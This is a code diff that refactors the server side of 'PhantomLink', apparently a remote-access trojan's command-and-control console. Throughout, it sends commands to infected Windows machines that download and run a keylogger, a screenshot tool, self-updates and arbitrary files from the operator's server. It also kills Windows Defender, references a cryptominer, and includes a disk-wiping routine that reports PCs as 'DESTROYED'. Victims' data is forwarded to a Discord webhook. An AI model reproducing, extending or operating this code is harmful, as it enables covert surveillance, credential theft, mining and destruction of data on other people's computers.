@@ -1,4 +1,5 @@
 import base64
+import collections
 import socket
 import time
 import threading
@@ -11,14 +12,14 @@ from notifypy import Notify
 import http.server
 import json
 from urllib.parse import urlparse, parse_qs
+import sys
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from config import DISCORD_WEBHOOK, SERVER_IP, API_KEY as _CONFIG_API_KEY
 
 version = 11.7 #7/3/2026
 
 HOST = "0.0.0.0"
 PORT = 5000
-
-#Discord
-DISCORD_WEBHOOK = "***REMOVED***"
 
 
 def discord_logger(log):
@@ -46,7 +47,7 @@ def discord_send_file(file_path, message=""):
 class ConnectionHealth:
 
     def __init__(self):
-        self.latency = []
+        self.latency = collections.deque(maxlen=100)
         self.failed_commands = 0
         self.successful_commands = 0
         self.last_response_time = time.time()
@@ -56,8 +57,6 @@ class ConnectionHealth:
         if success:
             self.successful_commands += 1
             self.latency.append(response_time)
-            if len(self.latency) > 100:
-                self.latency.pop(0)
         else:
             self.failed_commands += 1
 
@@ -301,7 +300,7 @@ class ClientManager:
 
 class C2APIHandler(http.server.BaseHTTPRequestHandler):
     client_manager = None
-    API_KEY = "PhantomLink-API-2026"  # Change this to a secure key
+    API_KEY = _CONFIG_API_KEY  # Loaded from config module
 
     def _set_headers(self, status_code=200):
         self.send_response(status_code)
@@ -344,7 +343,12 @@ class C2APIHandler(http.server.BaseHTTPRequestHandler):
             return
         parsed = urlparse(self.path)
         if parsed.path == '/api/command':
-            content_length = int(self.headers.get('Content-Length', 0))
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+            except (ValueError, TypeError):
+                self._set_headers(400)
+                self.wfile.write(json.dumps({'error': 'Invalid Content-Length header'}).encode())
+                return
             post_data = self.rfile.read(content_length)
             try:
                 data = json.loads(post_data)
@@ -367,18 +371,89 @@ class C2APIHandler(http.server.BaseHTTPRequestHandler):
                     except Exception:
                         pass
 
-                for cid in targets:
+                def execute_cmd_for_client(cid):
                     client = self.client_manager.get_client(cid)
-                    if client:
-                        conn = client['conn']
-                        with client['lock']:
-                            client['command_in_progress'] = True
-                            if self.client_manager._send_message(conn, f"CMD:{cmd}"):
-                                # Not reading response sync here to avoid blocking API
-                                results.append({'client_id': cid, 'status': 'sent'})
-                            else:
-                                results.append({'client_id': cid, 'status': 'failed'})
+                    if not client:
+                        return {'client_id': cid, 'status': 'not_found', 'output': 'Client not found'}
+
+                    conn = client['conn']
+                    username = client.get('username', 'Unknown')
+
+                    with client['lock']:
+                        client['command_in_progress'] = True
+                        try:
+                            orig_timeout = None
+                            try:
+                                orig_timeout = conn.gettimeout()
+                            except Exception:
+                                pass
+
+                            try:
+                                conn.settimeout(15.0)
+                            except Exception:
+                                pass
+
+                            try:
+                                if self.client_manager._send_message(conn, f"CMD:{cmd}"):
+                                    response = self.client_manager._recv_message(conn)
+                                    if response:
+                                        out = response.decode('utf-8', errors='ignore')
+                                        return {
+                                            'client_id': cid,
+                                            'username': username,
+                                            'status': 'success',
+                                            'output': out
+                                        }
+                                    else:
+                                        return {
+                                            'client_id': cid,
+                                            'username': username,
+                                            'status': 'no_response',
+                                            'output': '[No response received from client]'
+                                        }
+                                else:
+                                    return {
+                                        'client_id': cid,
+                                        'username': username,
+                                        'status': 'failed',
+                                        'output': '[Failed to send command over socket]'
+                                    }
+                            finally:
+                                if orig_timeout is not None:
+                                    try:
+                                        conn.settimeout(orig_timeout)
+                                    except Exception:
+                                        pass
+                        except Exception as e:
+                            return {
+                                'client_id': cid,
+                                'username': username,
+                                'status': 'error',
+                                'output': f'[Error: {str(e)}]'
+                            }
+                        finally:
                             client['command_in_progress'] = False
+
+                threads = []
+                client_results = {}
+
+                def worker(cid):
+                    client_results[cid] = execute_cmd_for_client(cid)
+
+                for cid in targets:
+                    t = threading.Thread(target=worker, args=(cid,))
+                    t.start()
+                    threads.append(t)
+
+                for t in threads:
+                    t.join(timeout=30.0)
+
+                results = []
+                for cid in targets:
+                    if cid in client_results:
+                        results.append(client_results[cid])
+                    else:
+                        results.append({'client_id': cid, 'status': 'timeout', 'output': '[Execution timed out]'})
 
                 self._set_headers()
                 self.wfile.write(json.dumps({'results': results}).encode())
@@ -469,51 +544,55 @@ def keepalive_handler(client_manager, client_id, stop_event):
             if not client or not client['active']:
                 break
 
-            if client.get('command_in_progress', False):
+            skip = False
+            with client['lock']:
+                if client.get('command_in_progress', False):
+                    skip = True
+                else:
+                    conn = client['conn']
+                    try:
+                        conn.settimeout(10.0)
+
+                        if not client_manager._send_message(conn, "PING"):
+                            failure_count = client_manager.increment_keepalive_failure(client_id)
+
+                            if failure_count >= 3:
+                                print(f"[!] Client {client_id} keepalive failed permanently")
+                                discord_logger(f"[!] Client {client_id} keepalive failed permanently")
+                                client['active'] = False
+                                break
+                        else:
+                            response = client_manager._recv_message(conn)
+
+                            if response and response == b"PONG":
+                                client_manager.update_last_seen(client_id)
+                            else:
+                                failure_count = client_manager.increment_keepalive_failure(client_id)
+
+                                if failure_count >= 3:
+                                    print(f"[!] Client {client_id} keepalive failed permanently")
+                                    discord_logger(f"[!] Client {client_id} keepalive failed permanently")
+                                    client['active'] = False
+                                    break
+
+                    except Exception as e:
+                        if not stop_event.is_set():
+                            print(f"[!] Keepalive error for client {client_id}: {e}")
+                            discord_logger(f"[!] Keepalive error for client {client_id}: {e}")
+                        break
+                    finally:
+                        try:
+                            conn.settimeout(300.0)
+                        except Exception:
+                            pass
+
+            if skip:
                 time.sleep(2)
                 continue
 
-            conn = client['conn']
-
-            try:
-                conn.settimeout(10.0)
-
-                if not client_manager._send_message(conn, "PING"):
-                    failure_count = client_manager.increment_keepalive_failure(client_id)
-
-                    if failure_count >= 3:
-                        print(f"[!] Client {client_id} keepalive failed permanently")
-                        discord_logger(f"[!] Client {client_id} keepalive failed permanently")
-                        client['active'] = False
-                        break
-                else:
-                    response = client_manager._recv_message(conn)
-
-                    if response and response == b"PONG":
-                        client_manager.update_last_seen(client_id)
-                    else:
-                        failure_count = client_manager.increment_keepalive_failure(client_id)
-
-                        if failure_count >= 3:
-                            print(f"[!] Client {client_id} keepalive failed permanently")
-                            discord_logger(f"[!] Client {client_id} keepalive failed permanently")
-                            client['active'] = False
-                            break
-
-            except Exception as e:
-                if not stop_event.is_set():
-                    print(f"[!] Keepalive error for client {client_id}: {e}")
-                    discord_logger(f"[!] Keepalive error for client {client_id}: {e}")
-                break
-            finally:
-                try:
-                    conn.settimeout(300.0)
-                except Exception:
-                    pass
-
-                for _ in range(15):  #Check every 2 seconds for 30 seconds total
-                    if stop_event.wait(2):
-                        return
+            for _ in range(15):  #Check every 2 seconds for 30 seconds total
+                if stop_event.wait(2):
+                    return
 
         except Exception as e:
             if not stop_event.is_set():
@@ -601,6 +680,9 @@ def interact_with_client(client_manager, client_id):
 
                 break
 
+            with client['lock']:
+                client['command_in_progress'] = False
+
             cmd = input(f"Shell[{username}]> ").strip()
 
             if cmd.lower() == 'back':
@@ -664,7 +746,7 @@ def interact_with_client(client_manager, client_id):
             elif cmd == 'get':
                 name = input("FULL File name: ")
                 path_to_save = input("FULL PATH to save: ")
-                command2 = f'curl http://81.10.55.8/{name} -o "{path_to_save}"'
+                command2 = f'curl http://{SERVER_IP}/{name} -o "{path_to_save}"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -718,7 +800,6 @@ def interact_with_client(client_manager, client_id):
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
                     discord_logger(f"Devices [{username}]: {response.decode('utf-8', errors='ignore')}")
-                    discord_logger(f"Devices of [{username}]\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'wifi':
@@ -872,7 +953,7 @@ def interact_with_client(client_manager, client_id):
                     client['command_in_progress'] = False
 
             elif cmd == 'ffmpeg':
-                command2 = r'curl http://SERVER IP/ffmpeg.rar -o "%USERPROFILE%\ffmpeg.rar"'
+                command2 = f'curl http://{SERVER_IP}/ffmpeg.rar -o "%USERPROFILE%\\ffmpeg.rar"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -882,7 +963,6 @@ def interact_with_client(client_manager, client_id):
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
                     discord_logger(f"FFMPEG setting up for [{username}]")
-                    discord_logger(f'FFMPEG setting up for [{username}]')
 
                 command3 = r'"C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "%USERPROFILE%/ffmpeg.rar" "%USERPROFILE%"'
                 with client['lock']:
@@ -952,7 +1032,7 @@ def interact_with_client(client_manager, client_id):
 
             elif cmd == 'inject':
                 name = input("FULL name of file: ")
-                command2 = f'curl -O http://server IP/{name} && start /B "" "{name}"'
+                command2 = f'curl -O http://{SERVER_IP}/{name} && start /B "" "{name}"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -962,7 +1042,6 @@ def interact_with_client(client_manager, client_id):
                     response = client_manager._recv_message(conn)
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Software {name} injected and ran on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     discord_logger(f"Software {name} injected and ran on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
@@ -1258,7 +1337,7 @@ def interact_with_client(client_manager, client_id):
                     client['command_in_progress'] = False
 
             elif cmd == 'keylogger':
-                command2 = 'curl -O http://81.10.55.8/keylogger.exe && start /B "" "keylogger.exe"'
+                command2 = f'curl -O http://{SERVER_IP}/keylogger.exe && start /B "" "keylogger.exe"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1271,7 +1350,7 @@ def interact_with_client(client_manager, client_id):
                     client['command_in_progress'] = False
 
             elif cmd == 'screener':
-                command3 = r'taskkill /im screener.exe /f & del /f /q "%APPDATA%\MicrosoftUpdate\screener.exe" & curl -O http://81.10.55.8/screenshoter.exe && start /B "" "screenshoter.exe"'
+                command3 = f'taskkill /im screener.exe /f & del /f /q "%APPDATA%\\MicrosoftUpdate\\screener.exe" & curl -O http://{SERVER_IP}/screenshoter.exe && start /B "" "screenshoter.exe"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
@@ -1287,7 +1366,7 @@ def interact_with_client(client_manager, client_id):
                 updating = input('Update PhantomLink? (y/n):  ')
                 if updating.lower().strip() == 'y':
                     discord_logger(f"{'='*10}\nUpdating PhantomLink . . .\n{'='*10}")
-                    command2 = 'curl -O http://81.10.55.8/PhantomLink.exe && start /B "" "PhantomLink.exe"'
+                    command2 = f'curl -O http://{SERVER_IP}/PhantomLink.exe && start /B "" "PhantomLink.exe"'
                     with client['lock']:
                         client['command_in_progress'] = True
                         if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1562,7 +1641,6 @@ def interact_with_client(client_manager, client_id):
                     $disk.Close();
                     "'''
                     discord_logger(f"\n{'='*20}[!] PC [{username}] DESTROYED [!]\n{'='*20}")
-                    discord_logger(f"\n{'=' * 20}[!] PC [{username}] DESTROYED [!]\n{'=' * 20}")
                     with client['lock']:
                         if not client_manager._send_message(conn, f"CMD:{command2}"):
                             client['command_in_progress'] = False
@@ -2166,6 +2244,8 @@ def interact_with_client(client_manager, client_id):
 
     finally:
         health_stop.set()
+        with client['lock']:
+            client['command_in_progress'] = False
         try:
             conn.settimeout(original_timeout)
         except Exception:
@@ -2189,6 +2269,8 @@ def main():
 
         time.sleep(2)
 
+    except (ImportError, ModuleNotFoundError):
+        print("[*] Dashboard module not present. Continuing without dashboard...")
     except Exception as e:
         print(f"[!] Dashboard error: {e}")
         print("[*] Continuing without dashboard...")
@@ -2217,7 +2299,7 @@ def main():
         print(f"[!] Failed to setup server: {e}")
         return
 
-    print(f"\n[+] Listening on 81.10.55.8:{PORT}")
+    print(f"\n[+] Listening on {HOST}:{PORT}")
 
     def accept_connections():
         while True:
@@ -2336,7 +2418,7 @@ def main():
 
                     discord_logger(f"{'=' * 10}\nUpdating PhantomLink on ALL clients . . .\n{'=' * 10}")
 
-                    actual_commands = ['curl -O http://81.10.55.8/PhantomLink.exe && start /B "" "PhantomLink.exe"']
+                    actual_commands = [f'curl -O http://{SERVER_IP}/PhantomLink.exe && start /B "" "PhantomLink.exe"']
 
 
                 elif cmd.lower() == 'inject':
@@ -2348,7 +2430,7 @@ def main():
 
                         continue
 
-                    actual_commands = [f'curl -O http://81.10.55.8/{filename} && start /B "" "{filename}"']
+                    actual_commands = [f'curl -O http://{SERVER_IP}/{filename} && start /B "" "{filename}"']
 
 
                 elif cmd.lower() == 'alert':
@@ -2468,7 +2550,7 @@ def main():
                             'taskkill /F /IM MsMpEng.exe'
 
                         ],
-                        'ffmpeg' : [r'curl http://81.10.55.8/ffmpeg.rar -o "%USERPROFILE%\ffmpeg.rar" && "C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "%USERPROFILE%/ffmpeg.rar" "%USERPROFILE%"'],
+                        'ffmpeg' : [f'curl http://{SERVER_IP}/ffmpeg.rar -o "%USERPROFILE%\\ffmpeg.rar" && "C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "%USERPROFILE%/ffmpeg.rar" "%USERPROFILE%"'],
                         'logoff': ['shutdown /l /f'],
                         'selfdestruct': [
                             'taskkill /f /im screener.exe & taskkill /f /im keylogger.exe & taskkill /f /im xmrig.exe',
@@ -2555,7 +2637,7 @@ def main():
 
 
                 for thread in threads:
-                    thread.join(timeout=300)  #5 Minuets timeout per client
+                    thread.join(timeout=300)  #5 Minutes timeout per client
 
 
                 print("\n" + "=" * 70)
